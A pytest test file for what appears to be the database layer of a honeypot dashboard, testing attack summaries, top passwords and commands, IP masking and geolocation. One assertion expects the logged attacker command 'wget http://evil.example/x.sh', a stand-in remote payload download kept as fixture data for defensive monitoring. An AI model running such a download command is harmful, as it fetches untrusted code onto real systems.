import sqlite3

import pytest

from api import db


def test_summary(db_path):
    conn = db.connect(db_path)
    s = db.summary(conn)
    assert s["total"] == 13
    assert s["ips"] == 2
    assert s["sessions"] == 2
    assert s["connections"] == 2
    assert s["login_failed"] == 3
    assert s["login_success"] == 1
    assert s["commands"] == 2
    assert s["downloads"] == 1
    assert s["countries"] == 0  # pas de table ip_info


def test_top_lists(db_path):
    conn = db.connect(db_path)
    passwords = db.top_passwords(conn, 5)
    assert passwords[0] == {"value": "123456", "n": 2}
    assert {p["value"] for p in passwords} == {"123456", "admin", "toor"}
    assert db.top_usernames(conn, 1)[0] == {"value": "root", "n": 3}
    assert {c["value"] for c in db.top_commands(conn, 10)} == {"uname -a", "wget http://evil.example/x.sh"}


def test_ips_are_masked_by_default(db_path, monkeypatch):
    monkeypatch.delenv("SHOW_FULL_IPS", raising=False)
    conn = db.connect(db_path)
    events = db.new_events(conn, 0, 100)
    assert events and all(e["ip"].endswith(".x") for e in events)
    assert db.mask_ip("203.0.113.10") == "203.0.113.x"
    assert db.mask_ip("2001:db8:1:2::5") == "2001:db8::x"
    assert db.mask_ip(None) is None


def test_full_ips_only_when_asked(monkeypatch):
    monkeypatch.setenv("SHOW_FULL_IPS", "1")
    assert db.mask_ip("203.0.113.10") == "203.0.113.10"


def test_connection_is_read_only(db_path):
    conn = db.connect(db_path)
    with pytest.raises(sqlite3.OperationalError):
        conn.execute("DELETE FROM events")


def test_missing_database(tmp_path):
    with pytest.raises(FileNotFoundError):
        db.connect(tmp_path / "absente.db")


def test_new_events_only_returns_attack_events(db_path):
    conn = db.connect(db_path)
    events = db.new_events(conn, 0, 100)
    assert len(events) == 9  # sans client.version ni session.closed
    ids = [e["id"] for e in events]
    assert ids == sorted(ids)
    assert {e["type"] for e in events} == {"connect", "login_failed", "login_success", "command", "download"}
    last = db.max_id(conn)
    assert db.new_events(conn, last, 100) == []


def test_timeline(db_path):
    conn = db.connect(db_path)
    assert db.timeline(conn, 7) == [
        {"hour": "2026-10-30T10:00:00Z", "n": 1},
        {"hour": "2026-10-31T11:00:00Z", "n": 1},
    ]
    assert db.timeline(conn, 1) == [{"hour": "2026-10-31T11:00:00Z", "n": 1}]


def test_with_geolocation(db_path):
    rw = sqlite3.connect(db_path)
    rw.execute("""CREATE TABLE ip_info (ip TEXT PRIMARY KEY, country_code TEXT, country TEXT, city TEXT,
                  latitude REAL, longitude REAL, asn INTEGER, asn_org TEXT, looked_up_at TEXT)""")
    rw.execute("INSERT INTO ip_info VALUES ('203.0.113.10', 'FR', 'France', 'Paris', 48.85, 2.35, 64500, 'TEST', 'now')")
    rw.commit()
    rw.close()
    conn = db.connect(db_path)
    assert db.summary(conn)["countries"] == 1
    assert db.top_countries(conn, 5) == [{"country_code": "FR", "country": "France", "ips": 1, "attacks": 1}]
    located = [e for e in db.recent_attacks(conn, 50) if e["lat"] is not None]
    assert located and located[0]["country_code"] == "FR"
